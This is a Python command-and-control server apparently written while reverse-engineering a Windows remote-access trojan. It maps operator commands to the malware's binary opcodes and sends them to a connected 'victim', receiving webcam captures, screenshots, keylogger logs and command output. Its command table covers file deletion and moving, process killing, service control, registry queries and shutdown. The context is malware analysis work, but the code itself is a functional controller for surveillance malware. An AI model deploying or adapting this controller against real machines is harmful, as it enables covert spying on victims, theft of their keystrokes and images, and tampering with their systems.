import socket
import threading
from pwn import *
import logging
import sys

conn_list= {}

commands = {"CHECK FILE": ["FileNameToFind", "Returns file name if present", 2013], #DONE
            "COPY": ["NewFileName, ExistingFileName", "Copies a file", 2014],   #DONE
            "DELETE": ["FileName", "Deletes a file", 2016],                         #DONE
            "MOVE": ["ExistingFileNamePath, NewFileNamePath", "Moves a file", 2017, 2018],  #DONE
            "CREATE": ["None", "Creates a directory", 2015],                #DONE
            "REGISTRY": ["None", "Retrieves information on registry key", 2090], #DONE
            "APP PATH": ["None", "Retrieves application paths", 3010],       #DONE
            "CD ROM": ["None", "Closes CD-ROM door", 3032, 3033], # DONE
            "STOP SERVICE": ["ServiceName", "Stops specified service", 2082], # 
            "START SERVICE": ["ServiceName","Opens and starts specifed service", 2081], # 
            "TITLE WINDOW": ["None","Retrieves open window's title", 2004],      #DONE
            "OPEN": ["FileName/ApplicationName","Opens specified file or application/service", 2026, 3011], # 
            "SIGN OUT": ["None","Exit windows and signs out", 2030], #DONE
            "START SERVER": ["None","Start server on port 23", 2001], # DONE
            "CLOSE PROCESS": ["ProcessName", "Closes specified process", 2003],     #DONE
            "PROCESS INFO": ["None", "Retrieves running proccesses information", 2002], #DONE
            "GET DRIVES": ["None", "Retrieves available disks/drives", 2010], # DONE
            "SERVER CONNECT": ["None", "Connects to server on port 1001", 1991],        #DONE
            "SCREENSHOT": ["None", "Takes screenshot", 2050],  # triggers an error...
            "WEBCAM": ["None", "Takes a webcam capture", 3020], # DONE 
            "LOGS": ["None","Sends keylogger file contents", 2060], #   DONE
            "NEW LOGS": ["None", "Starts new log file", 2062], # ????????
            "DISPLAY ON": ["None", "Powers on display", 3030],  #DONE
            "DISPLAY OFF": ["None", "Shuts off display", 3031], #DONE
            "PIXEL LINES": ["None","Draws vertical lines on screen", 3034],  # DONE
            "SHUTDOWN": ["None", "Shutdown system", 2031], # DONE
            "EXIT PROCESS": ["None", "Exits malware process", 1993],
            "SERVICE WIN32": ["", "Checks Win32 services name, status & config", 2080], # ?
            "CP": ["", "Copies something into char array sends something too idk", 2024], # ?
            "2028": ["", "Manage thread", 2028], # ?
            "2019": ["", "Writes bytes to file", 2019], # ?
            "2024": ["", "", 2024], # ? WRITE TO BYTE ARRAY  
            "3021": ["", "", 3021], # ?
            "2264": ["", "", 2264], # ?
            "2070": ["None", "Firefox"],  #?
            "2022": ["arg1, arg2", "", 2022], # ?writes bytes
            "1990": ["", "", 1990] # ?        
}

""" this function starts the c2server and creates a dictionary to save the connections it establishes """
def mainServer():
    global conn_list
    HOST = 'localhost'                 
    PORT = 1000           
    global count
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((HOST, PORT))
    s.listen(1)
    while True:
        conn, addr = s.accept()
        conn_list["conn1"] = conn

""" this function starts the secondary file transfer server and saves the established connection in a dictionary """
def server():
    HOST = 'localhost'                
    PORT = 1001           
    global count
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((HOST, PORT))
    s.listen(1)
    while True:
        conn, addr = s.accept()
        conn_list["conn2"] = conn
        
""" this function verifies the connection is still active and proceeds to wait for a jpg file to be received decodes it and saves it in the current directory """
def serverReceive():
    pic = []
    conn = conn_list["conn2"]
    if conn:
        while True:
            try:
                conn.settimeout(20.0)
                DATA = conn.recv(4116)
                conn.settimeout(None)
                print(DATA)
                pic.append(DATA)
            except:
                print("Done")
                break
            
        #logging.info(" [+] RECEIVED: ", b[2:].decode())

        f = open('pic.jpg','wb')

        for i in range(len(pic)):
            if pic[i][0:4] != b'\x05\x08\x00\x00': # data opcode
                continue
            else:
                f.write(pic[i][4:])
               
        pic = []

        f.close()

        return

""" this function initiates interactive mode with victim's connection """ 
def interact():
    global conn_list

    if conn_list:
        console(conn_list["conn1"])
    else:
        print("\nNo connection")

""" This function defines the c2server interactive console for taking commands and arguments and sending to victim """
def console(conn):
    global commands
    while True:
        cmd = (input("\nEnter command\n> "))
        if cmd == "exit":
            return 0
        else:
            arg1 = input("Enter argument 1 or press 'Enter' twice if none\n> ")
            arg2 = input("Enter argument 2 or press 'Enter' once\n> ")
            logging.info(" [+] BEGIN COMMAND:" + cmd + " " + arg1 + " " + arg2) # logging command
            cmd1 = p32(commands[cmd][2])
            arg1 = arg1.encode('utf-8')
            arg1 = arg1 + b'\0' * (712 - len(arg1))
            arg2 = arg2.encode('utf-8')
            COMMAND = cmd1 + arg1 + arg2
            print(COMMAND)

            # send and await response
            conn.sendall(COMMAND)

             # special command: server 2
            if cmd == "SERVER CONNECT": 
                server2 = threading.Thread(target=server)
                server2.start()
                START = " [+] Server on port 1001 started"
                print("\n\033[92m", START)
                logging.info(START) # logging server start
                logging.info(" [+] END COMMAND")
                continue
            elif cmd == "WEBCAM" or cmd == "SCREENSHOT":
                serverReceive()
                continue

            while True:
                
                try:
                    conn.settimeout(10.0)
                    DATA = conn.recv(1024)
                    conn.settimeout(None)
                    #print(DATA)
                    b = bytes(filter(None,DATA)) # filter response
                    print(b[2:].decode())                            
                    logging.info(" [+] RECEIVED: " + b[2:].decode()) # logging response
                except:
                    print("Done! (If data was expected and none arrived, an error occurred...)")
                    logging.info(" [+] END COMMAND")
                    break
    return 0            

""" this function displays available commands and their corresponding arguments """
def Commands():
    global commands

    print("Available commands:\n")
    print(" Command                         Arguments                               Description")
    print("---------                       -------------                            -----------")
    
    for i in commands:
        print(" {}".format(i) + " " * (32 - len(i)) + "{}".format(commands[i][0]) + " " * (40 - len(commands[i][0])) + "{}".format(commands[i][1]))

""" this function provides information on how to use the c2server """
def Help():
    options = {}
    options["end"] = ["Stop Server"]
    options["commands"] = ["List of available commands and description"]
    options["interact"] = ["Interact with client"]
    options["exit"] = ["Exit"]
    options["help"] = ["Display menu options"]

    print("\n Command                         Description")
    print("---------                       -------------") 

    for i in options:
        print(" {}".format(i) + " " * (32 - len(i)) + "{}".format(options[i][0]) + " " * (36 - len(options[i][0])))


# def Exit():
#     sys.exit(0)


def main():

    print("\n>>>>>>>>>>>>>>>>>>>>>><<<<<<<<<<<<<<<<<<<<<<")
    print(">>>>>>>> Welcome To My RE Nightmare <<<<<<<<")
    print(">>>>>>>>>>>>>>>>>>>>>><<<<<<<<<<<<<<<<<<<<<<\n")

    # set up looging file
    logging.basicConfig(format='%(asctime)s %(message)s', datefmt='%m/%d/%Y %I:%M:%S %p', filename='server.log', level=logging.INFO)
    
    # start servers
    server1 = threading.Thread(target=mainServer)
    server1.start()
    START = " [+] Server Started"
    print(START)
    logging.info(START) # logging server start

    # home menu choices
    while True:
        print("\nEnter an option below or type 'help'")
        choice  = input("> ")
        if choice =='interact' or choice =='i':
            p = threading.Thread(target=interact)
            p.start()
            p.join()
        elif choice == "help":
            Help()     
        elif choice == "commands":
            Commands()
        #elif choice == "exit":
        #     Exit()
        else:
            pass


if __name__ == "__main__":
    main()
